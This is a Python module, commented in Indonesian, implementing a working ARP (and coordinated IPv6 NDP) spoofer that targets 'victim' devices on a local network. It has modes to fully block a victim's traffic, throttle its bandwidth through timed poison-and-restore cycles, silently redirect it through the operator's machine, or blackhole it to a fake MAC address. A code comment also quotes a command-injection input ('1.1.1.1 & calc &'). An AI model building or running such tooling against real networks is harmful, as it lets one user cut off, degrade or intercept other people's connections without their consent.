#!/usr/bin/env python3
"""
High-Performance Thread-Safe ARP Spoofer
========================================
- Menggunakan sendp Layer 2 dengan Scapy dan Ethernet/ARP manual.
- Mengimplementasikan Initial Burst & Duty-Cycle PWM Throttling.
- Lock contention teratasi: mutasi state dipisahkan dari operasi I/O jaringan.
- Auto-refresh interface saat pergantian jaringan/Wi-Fi.
"""

import sys
import time
import threading
import random
import uuid
import subprocess  # dipakai _ensure_host_gateway_locked (sebelumnya hilang → NameError senyap)
from typing import Dict, Optional, Any, List, Tuple
from scapy.all import sendp, ARP, Ether, conf, ifaces
from .network import (
    get_network_info,
    set_ip_forwarding,
    is_forwarding_enabled,
    is_valid_private_ip,
    is_valid_mac,
    get_current_gateway,
)
from .spoofer_v6 import ndp_spoofer
from ..utils.logger import logger
from ..exceptions.custom import SpoofError, SessionNotFoundError

conf.verb = 0

class ARPSpoofer:
    def __init__(self):
        self._sessions: Dict[str, Dict[str, Any]] = {}
        self._threads: Dict[str, threading.Thread] = {}
        self._stop_events: Dict[str, threading.Event] = {}
        self._running = False
        self._lock = threading.Lock()
        self._interface = None
        self._win_interface_name = None
        self._self_mac = None
        self._fwd_was_enabled = None   # baseline IP forwarding sebelum disentuh
        self._fwd_touched = False      # True bila kita yang mengubah forwarding

        self.refresh_interface()

    def _ensure_host_gateway_locked(self, gateway_ip: str, gateway_mac: str):
        """Kunci ARP Gateway pada level kernel Windows secara permanen agar Controller bebas RTO."""
        if sys.platform != 'win32' or not gateway_ip or not gateway_mac:
            return
        # KEAMANAN (P1): validasi ketat SEBELUM menyentuh netsh — mencegah command
        # injection via parameter gateway tak tepercaya (mis. "1.1.1.1 & calc &").
        if not is_valid_private_ip(gateway_ip) or not is_valid_mac(gateway_mac):
            logger.debug("Notice: gateway_ip/gateway_mac invalid — lewati host gateway lock")
            return
        try:
            alias = self._win_interface_name or "Wi-Fi"
            norm_mac = gateway_mac.lower().replace(':', '-')
            # KEAMANAN (P1): arg-list tanpa shell=True (tidak ada interpolasi shell).
            subprocess.run(
                ["netsh", "interface", "ipv4", "add", "neighbors", alias, gateway_ip, norm_mac],
                shell=False,
                capture_output=True,
                timeout=1.5,
                creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0)
            )
        except Exception as e:
            logger.debug(f"Notice locking host gateway ARP: {e}")

    def refresh_interface(self):
        """Dapatkan interface Scapy yang valid dan nama alias Windows-nya."""
        with self._lock:
            try:
                info = get_network_info()
                my_ip = info.get('ip')
                self._interface = None
                self._win_interface_name = None
                self._self_mac = None

                ignored_keywords = ['bluetooth', 'loopback', 'virtual', 'vethernet', 'wsl', 'tap', 'host-only', 'npcap']

                # 1. Cari berdasarkan IP aktif
                if my_ip:
                    for scapy_name, scapy_obj in ifaces.items():
                        if hasattr(scapy_obj, 'ips') and my_ip in scapy_obj.ips:
                            self._interface = scapy_obj
                            self._win_interface_name = getattr(scapy_obj, 'name', 'Wi-Fi')
                            self._self_mac = getattr(scapy_obj, 'mac', None)
                            break

                # 2. Cari interface Wi-Fi / Ethernet fisik (hindari Bluetooth & Virtual Adapter)
                if not self._interface:
                    for name, iface_obj in ifaces.items():
                        if not iface_obj or not getattr(iface_obj, 'mac', None):
                            continue
                        iface_str = (str(name) + " " + str(getattr(iface_obj, 'name', '')) + " " + str(getattr(iface_obj, 'description', ''))).lower()
                        if any(k in iface_str for k in ignored_keywords):
                            continue
                        # Utamakan Wi-Fi / Wireless / 802.11 / Ethernet
                        if any(w in iface_str for w in ['wi-fi', 'wlan', 'wireless', '802.11', 'ethernet']):
                            self._interface = iface_obj
                            self._win_interface_name = getattr(iface_obj, 'name', 'Wi-Fi')
                            self._self_mac = iface_obj.mac
                            break

                # 3. Fallback ke sembarang interface non-Bluetooth
                if not self._interface:
                    for name, iface_obj in ifaces.items():
                        if iface_obj and getattr(iface_obj, 'mac', None):
                            iface_str = (str(name) + " " + str(getattr(iface_obj, 'name', '')) + " " + str(getattr(iface_obj, 'description', ''))).lower()
                            if any(k in iface_str for k in ignored_keywords):
                                continue
                            self._interface = iface_obj
                            self._win_interface_name = getattr(iface_obj, 'name', 'Wi-Fi')
                            self._self_mac = iface_obj.mac
                            break

                if not self._interface:
                    self._interface = conf.iface
                    self._win_interface_name = getattr(conf.iface, 'name', 'Wi-Fi')
                    self._self_mac = getattr(conf.iface, 'mac', '00:00:00:00:00:00')

                if self._self_mac:
                    self._self_mac = str(self._self_mac).lower().replace('-', ':')
                else:
                    self._self_mac = '00:00:00:00:00:00'

            except Exception as e:
                logger.warning(f"Gagal refresh interface: {e}, fallback conf.iface")
                self._interface = conf.iface
                self._win_interface_name = getattr(conf.iface, 'name', 'Wi-Fi')
                self._self_mac = getattr(conf.iface, 'mac', '00:00:00:00:00:00')
                if self._self_mac:
                    self._self_mac = str(self._self_mac).lower().replace('-', ':')

            logger.info(f"🖥️ Interface terpilih: {self._interface} [Win Alias: {self._win_interface_name}] (MAC: {self._self_mac})")

    def _compute_forward_target(self) -> bool:
        """
        Hitung apakah kernel IP forwarding harus ON.
        HARUS dipanggil DI DALAM lock (hanya membaca state, TANPA I/O).
        Penerapan aktual (subprocess netsh) WAJIB dilakukan DI LUAR lock oleh pemanggil.
        - True bila TIDAK ADA sesi (pulihkan default) ATAU ada sesi redirect /
          transparent-gateway (paket target harus DITERUSKAN laptop).
        - False untuk sesi blok penuh DAN sesi throttle: keduanya memakai fase
          'racun = drop', jadi forwarding WAJIB OFF agar paket benar-benar jatuh
          saat fase racun. Bila forwarding ON, throttle tidak akan membatasi apa pun.
        """
        active_sessions = [
            session
            for session in self._sessions.values()
            if session.get('active', True)
        ]
        if not active_sessions:
            return True
        return any(s.get('is_redirect', False) for s in active_sessions)

    def _build_unicast_reply_packet(self, target_ip: str, spoof_ip: str, target_mac: str) -> List[Ether]:
        """
        Bangun paket ARP reply (is-at) murni tanpa who-has:
        Digunakan khusus untuk Transparent Gateway & Redirect agar Access Point Router
        tidak pernah mendeteksi IP Conflict pada IP Gateway, sehingga Laptop 100% bebas RTO.
        """
        ether_reply = Ether(dst=target_mac, src=self._self_mac)
        arp_reply = ARP(op="is-at", psrc=spoof_ip, pdst=target_ip, hwsrc=self._self_mac, hwdst=target_mac)
        return [ether_reply / arp_reply]

    def _generate_blackhole_mac(self, victim_mac: str = "", gateway_mac: str = "") -> str:
        """
        Buat MAC 'hantu' locally-administered unicast yang DIJAMIN tidak ada di jaringan.
        Dipakai mode blackhole (Gaming): router mengirim trafik korban ke MAC ini →
        di-drop di Access Point, TIDAK pernah menyentuh kartu Wi-Fi operator (anti-lag).
        Oktet-1: set bit locally-administered (0x02), clear bit multicast (0x01).
        """
        forbidden = {
            (self._self_mac or '').lower(),
            (victim_mac or '').lower().replace('-', ':'),
            (gateway_mac or '').lower().replace('-', ':'),
            'ff:ff:ff:ff:ff:ff',
        }
        for _ in range(10):
            first = (random.randint(0, 255) & 0xFE) | 0x02  # unicast + locally-administered
            octets = [first] + [random.randint(0, 255) for _ in range(5)]
            mac = ':'.join(f"{b:02x}" for b in octets)
            if mac not in forbidden and not mac.startswith('01:00:5e'):
                return mac
        return '02:00:00:de:ad:00'  # fallback statis (tetap locally-administered unicast)

    def _build_spoof_packets(self, target_ip: str, spoof_ip: str, target_mac: str, poison_mac: Optional[str] = None) -> List[Ether]:
        """
        Bangun paket spoofing Unicast ARP Reply (op='is-at').
        `poison_mac` = MAC yang DIKLAIM sebagai lokasi `spoof_ip` (default self_mac).
        Untuk mode blackhole diberi MAC hantu → trafik korban jatuh di AP, bukan ke operator.
        Ether.src tetap self_mac (frame fisik dari kita); hanya hwsrc ARP yang berubah.
        """
        hwsrc = (poison_mac or self._self_mac)
        ether_reply = Ether(dst=target_mac, src=self._self_mac)
        arp_reply = ARP(op="is-at", psrc=spoof_ip, pdst=target_ip, hwsrc=hwsrc, hwdst=target_mac)
        return [ether_reply / arp_reply]

    def _build_restore_packets(self, victim_ip: str, victim_mac: str, gateway_ip: str, gateway_mac: str) -> Tuple[List[Ether], List[Ether]]:
        """
        Bangun paket pemulihan (Restore) ganda (Dual-Opcode Restore):
        1. ARP Reply (op='is-at'): Standar update cache.
        2. ARP Request (op='who-has'): Memaksa update ARP table pada Android 11+ dan iOS
           yang menolak/mengabaikan unsolicited ARP reply.
        Mengembalikan: (packets_for_victim, packets_for_gateway)
        """
        # Paket untuk memulihkan tabel ARP Victim (arah: Gateway asli)
        v_reply = Ether(dst=victim_mac, src=gateway_mac) / ARP(
            op="is-at", psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac, hwdst=victim_mac
        )
        v_req = Ether(dst=victim_mac, src=gateway_mac) / ARP(
            op="who-has", psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac, hwdst="00:00:00:00:00:00"
        )

        # Paket untuk memulihkan tabel ARP Gateway (arah: Victim asli)
        gw_reply = Ether(dst=gateway_mac, src=victim_mac) / ARP(
            op="is-at", psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac, hwdst=gateway_mac
        )
        gw_req = Ether(dst=gateway_mac, src=victim_mac) / ARP(
            op="who-has", psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac, hwdst="00:00:00:00:00:00"
        )

        return ([v_reply, v_req], [gw_reply, gw_req])

    def _spoof_loop(self, session_id: str, stop_event: threading.Event):
        """Loop spoofing dengan Initial Burst kondisional dan TCP-Friendly PWM Throttling."""
        with self._lock:
            session = self._sessions.get(session_id)
            if not session:
                return
            victim_ip = session['victim_ip']
            victim_mac = session['victim_mac']
            gateway_ip = session['gateway_ip']
            gateway_mac = session['gateway_mac']
            speed_limit = session.get('speed_limit', 0)
            is_redirect = session.get('is_redirect', False)
            blackhole_mac = session.get('blackhole_mac')  # None utk sesi biasa; MAC hantu utk Gaming
            iface = self._interface

        logger.info(f"🚀 Spoofing loop berjalan: {victim_ip} <-> {gateway_ip} (Limit: {speed_limit}%)")

        # FASE 1: INITIAL BURST (5 paket cepat < 0.1s untuk penguncian instan)
        # HANYA dieksekusi jika mode Full Block (speed_limit <= 0) dan BUKAN Redirect agar gateway router tidak diracuni
        if speed_limit <= 0 and not is_redirect:
            try:
                init_victim = self._build_spoof_packets(victim_ip, gateway_ip, victim_mac, poison_mac=blackhole_mac)
                init_gw = self._build_spoof_packets(gateway_ip, victim_ip, gateway_mac, poison_mac=blackhole_mac)
                burst_count = 0
                for _ in range(5):
                    if stop_event.is_set():
                        return
                    for p in init_victim:
                        sendp(p, iface=iface, verbose=False)
                        burst_count += 1
                    for p in init_gw:
                        sendp(p, iface=iface, verbose=False)
                        burst_count += 1
                    time.sleep(0.015)

                with self._lock:
                    if session_id in self._sessions:
                        self._sessions[session_id]['packets_sent'] = (
                            self._sessions[session_id].get('packets_sent', 0) + burst_count
                        )
            except Exception as e:
                logger.debug(f"Initial burst notice: {e}")
        else:
            reason = "Mode Redirect aktif" if is_redirect else "Mode Throttling aktif"
            logger.info(f"🛡️ Initial burst dilewati untuk session {session_id} ({reason})")

        # FASE 2: STEADY-STATE KEEP-ALIVE & TCP-FRIENDLY DUTY-CYCLE THROTTLING
        # Periode siklus 1.2 detik memberi ruang napas bagi TCP Congestion Window
        cycle_period = 1.2

        while not stop_event.is_set():
            try:
                with self._lock:
                    session = self._sessions.get(session_id)
                    if not session:
                        break
                    speed_limit = session.get('speed_limit', 0)
                    is_redirect = session.get('is_redirect', False)

                pkts_victim = self._build_spoof_packets(victim_ip, gateway_ip, victim_mac, poison_mac=blackhole_mac)
                pkts_gateway = self._build_spoof_packets(gateway_ip, victim_ip, gateway_mac, poison_mac=blackhole_mac)

                if is_redirect:
                    # MODE REDIRECT / TRANSPARENT GATEWAY (Safe Unicast Outbound Capture):
                    # 1. Gunakan UNICAST 'is-at' MURNI ke victim (TIDAK mengirim who-has ber-IP Gateway):
                    # Menghilangkan proteksi IP Conflict di AP Router sehingga Laptop 100% BEBAS RTO.
                    safe_victim_pkts = self._build_unicast_reply_packet(victim_ip, gateway_ip, victim_mac)
                    for p in safe_victim_pkts:
                        sendp(p, iface=iface, verbose=False)

                    # 2. Router Gateway TIDAK DIRACUNI SAMA SEKALI:
                    # Trafik download internet dikirimkan langsung dari Router -> Smartphone target
                    # (Menghindari Windows Firewall block, mencegah Wi-Fi MAC flapping, dan internet target 100% lancar)

                    with self._lock:
                        if session_id in self._sessions:
                            self._sessions[session_id]['packets_sent'] = (
                                self._sessions[session_id].get('packets_sent', 0) + len(safe_victim_pkts)
                            )

                    # Jeda aman 1.2 detik memberi napas penuh bagi Wi-Fi medium
                    if stop_event.wait(1.2):
                        break
                    continue

                # Jika speed_limit >= 100 (dan bukan redirect), jangan injeksikan paket racun
                if speed_limit >= 100:
                    if stop_event.wait(0.5):
                        break
                    continue

                if speed_limit <= 0:
                    # MODE FULL BLOCK: Kirim racun dua arah (Victim <-> Gateway)
                    # Forwarding = OFF memastikan seluruh paket victim & gateway langsung JATUH (DROP)
                    for p in pkts_victim:
                        sendp(p, iface=iface, verbose=False)
                    for p in pkts_gateway:
                        sendp(p, iface=iface, verbose=False)

                    with self._lock:
                        if session_id in self._sessions:
                            self._sessions[session_id]['packets_sent'] = (
                                self._sessions[session_id].get('packets_sent', 0) + len(pkts_victim) + len(pkts_gateway)
                            )

                    jitter = random.uniform(-0.05, 0.05)
                    sleep_time = max(0.25, 0.45 + jitter)
                    if stop_event.wait(sleep_time):
                        break
                else:
                    # ================= DUTY-CYCLE BANDWIDTH THROTTLE =================
                    # Membatasi bandwidth NYATA korban dengan bergantian dua fase per
                    # siklus (IP forwarding sesi throttle = OFF, lihat _compute_forward_target):
                    #   FASE RACUN (Tp): korban & gateway diarahkan ke laptop; karena
                    #     forwarding OFF, paket kedua arah JATUH (drop) -> trafik berhenti.
                    #   FASE NORMAL (Tn): tabel ARP korban & gateway DIPULIHKAN -> korban
                    #     bicara langsung ke router pada kecepatan PENUH.
                    # Rata-rata throughput korban ~= Tn / (Tp + Tn).
                    # speed_limit tinggi -> Rp kecil -> Tn besar -> bandwidth besar (monotonik).
                    poison_ratio = max(0.15, min(0.85, (100 - speed_limit) / 100.0 * 0.85))
                    t_poison = max(0.15, cycle_period * poison_ratio)
                    t_normal = max(0.25, cycle_period * (1.0 - poison_ratio))

                    # --- FASE RACUN: drop trafik dua arah selama t_poison ---
                    for p in pkts_victim:
                        sendp(p, iface=iface, verbose=False)
                    for p in pkts_gateway:
                        sendp(p, iface=iface, verbose=False)

                    with self._lock:
                        if session_id in self._sessions:
                            self._sessions[session_id]['packets_sent'] = (
                                self._sessions[session_id].get('packets_sent', 0)
                                + len(pkts_victim) + len(pkts_gateway)
                            )

                    if stop_event.wait(t_poison):
                        break

                    # --- FASE NORMAL: pulihkan ARP -> trafik lancar penuh selama t_normal ---
                    restore_v_pkts, restore_gw_pkts = self._build_restore_packets(
                        victim_ip, victim_mac, gateway_ip, gateway_mac
                    )
                    for p in restore_v_pkts:
                        sendp(p, iface=iface, verbose=False)
                    for p in restore_gw_pkts:
                        sendp(p, iface=iface, verbose=False)

                    if stop_event.wait(t_normal):
                        break

            except Exception as e:
                logger.error(f"Error di spoof loop session {session_id}: {e}")
                break

        with self._lock:
            if session_id in self._sessions:
                self._sessions[session_id]['active'] = False
        logger.info(f"⏹️ Session {session_id} berhenti")

    # ===== PUBLIC API =====

    def start(
        self,
        victim_ip: str,
        victim_mac: str,
        gateway_ip: str,
        gateway_mac: str,
        speed_limit: int = 0,
        is_redirect: bool = False,
        victim_ipv6: Optional[str] = None,
        gateway_ipv6: Optional[str] = None,
        blackhole: bool = False
    ) -> str:
        # Invariant 4: RFC 1918 Scope Strictness (validasi server-side, bukan hanya frontend)
        if not is_valid_private_ip(victim_ip):
            raise SpoofError(f"Target IP {victim_ip} di luar jangkauan RFC 1918 (private subnet)!")

        # Validasi format MAC target agar paket tidak dibangun dari input malformed
        if not is_valid_mac(victim_mac):
            raise SpoofError(f"Format MAC target '{victim_mac}' tidak valid!")

        # KEAMANAN (P1): validasi parameter gateway juga — nilai ini masuk ke
        # paket ARP dan (di Windows) ke perintah netsh. Tanpa validasi, gateway_ip/
        # gateway_mac tak tepercaya membuka command injection & paket malformed.
        if not is_valid_private_ip(gateway_ip):
            raise SpoofError(f"Gateway IP '{gateway_ip}' di luar jangkauan RFC 1918 (private subnet)!")
        if not is_valid_mac(gateway_mac):
            raise SpoofError(f"Format MAC gateway '{gateway_mac}' tidak valid!")

        # Invariant 1: Gateway Immunity
        # a. Terhadap gateway pada request yang sama (victim == gateway parameter)
        if victim_ip == gateway_ip or (victim_mac and gateway_mac and victim_mac.lower() == gateway_mac.lower()):
            raise SpoofError("Tidak dapat melakukan spoofing/throttling terhadap Gateway!")

        # b. Terhadap gateway sistem AKTUAL (mencegah bypass via gateway_ip palsu di request)
        sys_gw = get_current_gateway()
        if sys_gw and victim_ip == sys_gw:
            raise SpoofError("Gateway router asli kebal dari manipulasi L2!")

        # Invariant 2: Controller Self-Protection (Anti Self-Cut)
        # a. Berdasarkan MAC controller
        self_mac = (self._self_mac or '').lower().replace('-', ':')
        norm_vic_mac = (victim_mac or '').lower().replace('-', ':')
        if (self_mac and norm_vic_mac and norm_vic_mac == self_mac):
            raise SpoofError("Host controller sendiri (This PC) kebal dari manipulasi L2!")

        # b. Berdasarkan IP controller (melengkapi cek MAC di atas)
        try:
            my_ip = get_network_info().get('ip')
        except Exception:
            my_ip = None
        if my_ip and victim_ip == my_ip:
            raise SpoofError("Host controller sendiri (This PC) kebal dari manipulasi L2!")

        # Pastikan interface aktif dan mutakhir
        if not self._interface:
            self.refresh_interface()

        # Kunci tabel ARP gateway pada host controller agar koneksi laptop 100% kebal RTO
        self._ensure_host_gateway_locked(gateway_ip, gateway_mac)

        # Hentikan sesi aktif lama untuk victim_ip yang sama agar tidak terjadi akumulasi zombie thread
        with self._lock:
            existing_sids = [sid for sid, s in self._sessions.items() if s.get('victim_ip') == victim_ip and s.get('active')]
        for old_sid in existing_sids:
            try:
                self.stop(old_sid)
            except SpoofError:
                raise
            except Exception as e:
                raise SpoofError(
                    f"Gagal menghentikan session sebelumnya {old_sid}: {e}"
                ) from e

        # Koordinasi IPv6 Dual-Stack jika target memiliki IPv6
        v6_session_id = None
        if victim_ipv6 and gateway_ipv6:
            try:
                v6_session_id = ndp_spoofer.start_spoof(
                    victim_ipv6=victim_ipv6,
                    victim_mac=victim_mac,
                    gateway_ipv6=gateway_ipv6,
                    gateway_mac=gateway_mac,
                    speed_limit=speed_limit,
                    blackhole=blackhole
                )
            except Exception as e:
                logger.warning(f"Notice starting coordinated IPv6 session: {e}")

        session_id = f"{victim_ip}_{uuid.uuid4().hex}"
        with self._lock:
            stop_event = threading.Event()
            session = {
                'victim_ip': victim_ip,
                'victim_mac': victim_mac,
                'gateway_ip': gateway_ip,
                'gateway_mac': gateway_mac,
                'victim_ipv6': victim_ipv6,
                'gateway_ipv6': gateway_ipv6,
                'v6_session_id': v6_session_id,
                'speed_limit': max(0, min(100, int(speed_limit))),
                'is_redirect': is_redirect,
                # MAC hantu untuk mode blackhole (Gaming) agar trafik korban tak menyentuh operator.
                'blackhole_mac': self._generate_blackhole_mac(victim_mac, gateway_mac) if blackhole else None,
                'active': True,
                'started_at': time.time(),
                'packets_sent': 0
            }
            self._sessions[session_id] = session
            self._stop_events[session_id] = stop_event
            self._running = True

            thread = threading.Thread(target=self._spoof_loop, args=(session_id, stop_event), daemon=True)
            thread.start()
            self._threads[session_id] = thread

            # Hitung target IP forwarding DI DALAM lock; penerapan (netsh) DI LUAR lock.
            forward_target = self._compute_forward_target()
            iface_name = self._win_interface_name

        # Tangkap baseline forwarding SEKALI (sebelum kita pernah mengubahnya),
        # agar bisa dipulihkan ke kondisi semula saat stop_all (pola bettercap).
        if not self._fwd_touched:
            self._fwd_was_enabled = is_forwarding_enabled(iface_name)
            self._fwd_touched = True

        # Terapkan IP forwarding DI LUAR lock (subprocess netsh tidak boleh menahan mutex)
        set_ip_forwarding(forward_target, iface_name)

        logger.info(f"✅ Session {session_id} dimulai ({victim_ip}) with limit={session['speed_limit']}%")
        return session_id

    def set_speed_limit(self, session_id: str, speed_limit: int) -> bool:
        with self._lock:
            if session_id not in self._sessions:
                return False
            self._sessions[session_id]['speed_limit'] = max(0, min(100, int(speed_limit)))
            v6_id = self._sessions[session_id].get('v6_session_id')
            forward_target = self._compute_forward_target()
            iface_name = self._win_interface_name
            logger.info(f"⚡ Speed limit for session {session_id} updated to {speed_limit}%")

        # Terapkan IP forwarding DI LUAR lock
        set_ip_forwarding(forward_target, iface_name)

        if v6_id:
            try:
                ndp_spoofer.set_speed_limit(v6_id, speed_limit)
            except Exception as e:
                logger.debug(f"Notice updating IPv6 limit: {e}")

        return True

    def stop(self, session_id: str) -> bool:
        """
        Hentikan sesi spoofing.
        LOCK CONTENTION TERATASI: Operasi I/O sendp dan sleep dilakukan DI LUAR lock.
        """
        with self._lock:
            if session_id not in self._sessions:
                raise SessionNotFoundError(f"Session {session_id} tidak ditemukan")

            session = dict(self._sessions[session_id])
            was_restore_retry = bool(session.get('restore_failed'))
            self._sessions[session_id]['active'] = False
            self._sessions[session_id]['restore_failed'] = False
            stop_event = self._stop_events.get(session_id)
            if stop_event:
                stop_event.set()

            worker = self._threads.get(session_id)
            session_iface = self._interface
            v6_id = session.get('v6_session_id')
            self._running = any(
                current.get('active', False)
                for current in self._sessions.values()
            )

        restore_error = None

        if worker and worker is not threading.current_thread():
            try:
                worker.join(timeout=2.0)
                if worker.is_alive():
                    raise RuntimeError("worker spoofing tidak berhenti")
            except Exception as e:
                restore_error = e

        # Hentikan sesi IPv6 terkoordinasi jika ada
        if v6_id and restore_error is None:
            try:
                ndp_spoofer.stop_spoof(v6_id)
            except SessionNotFoundError as e:
                if not was_restore_retry:
                    restore_error = e
            except Exception as e:
                restore_error = e
            if restore_error is None:
                with self._lock:
                    retained = self._sessions.get(session_id)
                    if retained is not None:
                        retained['v6_session_id'] = None

        # Operasi restorasi jaringan DI LUAR LOCK (tidak memblokir thread atau API lain!)
        if restore_error is None:
            try:
                restore_v_pkts, restore_gw_pkts = self._build_restore_packets(
                    session['victim_ip'],
                    session['victim_mac'],
                    session['gateway_ip'],
                    session['gateway_mac']
                )
                for _ in range(4):
                    for p in restore_v_pkts:
                        sendp(p, iface=session_iface, verbose=False)
                    for p in restore_gw_pkts:
                        sendp(p, iface=session_iface, verbose=False)
                    time.sleep(0.03)
            except Exception as e:
                restore_error = e

        # Hitung target IP forwarding & flag running DI DALAM lock; penerapan DI LUAR lock
        with self._lock:
            if restore_error is None:
                self._sessions.pop(session_id, None)
                self._threads.pop(session_id, None)
                self._stop_events.pop(session_id, None)
            elif session_id in self._sessions:
                self._sessions[session_id]['active'] = False
                self._sessions[session_id]['restore_failed'] = True

            self._running = any(
                current.get('active', False)
                for current in self._sessions.values()
            )
            no_active_sessions = not self._running
            no_sessions_left = not self._sessions
            forward_target = self._compute_forward_target()
            iface_name = self._win_interface_name

        if no_active_sessions and self._fwd_touched:
            # Pulihkan baseline segera untuk safety, tetapi pertahankan snapshot
            # selama masih ada sesi gagal yang perlu direstore ulang.
            set_ip_forwarding(bool(self._fwd_was_enabled), iface_name)
            if no_sessions_left:
                self._fwd_touched = False
                self._fwd_was_enabled = None
        elif not no_active_sessions:
            set_ip_forwarding(forward_target, iface_name)

        if restore_error is not None:
            logger.error(f"Gagal restore session {session_id}: {restore_error}")
            raise SpoofError(
                f"Gagal memulihkan ARP session {session_id}: {restore_error}"
            ) from restore_error

        logger.info(f"✅ Session {session_id} dihentikan dengan mulus")
        return True

    def stop_all(self):
        logger.info("🛑 Menghentikan semua session...")
        with self._lock:
            session_ids = list(self._sessions.keys())
        failures = []

        for sid in session_ids:
            try:
                self.stop(sid)
            except Exception as e:
                logger.error(f"Gagal stop {sid}: {e}")
                failures.append((sid, e))

        try:
            ndp_spoofer.stop_all()
        except Exception as e:
            logger.error(f"Gagal stop semua session IPv6: {e}")
            failures.append(("IPv6 cleanup", e))

        with self._lock:
            self._running = any(
                session.get('active', False)
                for session in self._sessions.values()
            )
            no_active_sessions = not self._running
            no_sessions_left = not self._sessions
            iface_name = self._win_interface_name
            forwarding_baseline = bool(self._fwd_was_enabled)
            forwarding_was_touched = self._fwd_touched

        # Pulihkan IP forwarding ke BASELINE asli (bukan hard-set True) agar host
        # operator kembali seperti sebelum aplikasi dijalankan (pola bettercap).
        if no_active_sessions and forwarding_was_touched:
            try:
                set_ip_forwarding(forwarding_baseline, iface_name)
            except Exception as e:
                logger.error(f"Gagal memulihkan IP forwarding: {e}")
                failures.append(("IP forwarding", e))
            else:
                if no_sessions_left:
                    with self._lock:
                        if not self._sessions:
                            self._fwd_touched = False
                            self._fwd_was_enabled = None

        if failures:
            details = "; ".join(f"{scope}: {error}" for scope, error in failures)
            raise SpoofError(f"Gagal menghentikan semua ARP session: {details}")

        logger.info("✅ Semua session dihentikan")

    def get_sessions(self) -> Dict[str, Dict[str, Any]]:
        with self._lock:
            return {
                sid: {
                    'victim_ip': s['victim_ip'],
                    'victim_mac': s['victim_mac'],
                    'gateway_ip': s['gateway_ip'],
                    'gateway_mac': s['gateway_mac'],
                    'speed_limit': s.get('speed_limit', 0),
                    'active': s['active'],
                    'restore_failed': s.get('restore_failed', False),
                    'started_at': s['started_at'],
                    'packets_sent': s['packets_sent']
                }
                for sid, s in self._sessions.items()
            }

    @property
    def is_running(self) -> bool:
        with self._lock:
            return any(
                session.get('active', False)
                for session in self._sessions.values()
            )

ARPSpoofer.get_all_sessions = ARPSpoofer.get_sessions
